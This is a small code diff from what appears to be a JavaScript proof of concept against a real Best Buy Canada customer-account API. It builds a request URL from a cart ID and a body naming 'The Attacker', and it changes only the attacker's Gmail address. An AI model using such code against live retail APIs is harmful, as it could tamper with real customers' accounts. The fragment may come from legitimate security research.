@@ -21,7 +21,7 @@
     const url = `https://www.bestbuy.ca/api/account/customers/{${encodeURIComponent(cartId)}}`;
     const body = {
       defaultLanguage: "fr-CA",
-      email: "jayesh25tryme@gmail.com",
+      email: "jayeshtryme@gmail.com",
       firstName: "The",
       lastName: "Attacker",
       locale: "en-CA",
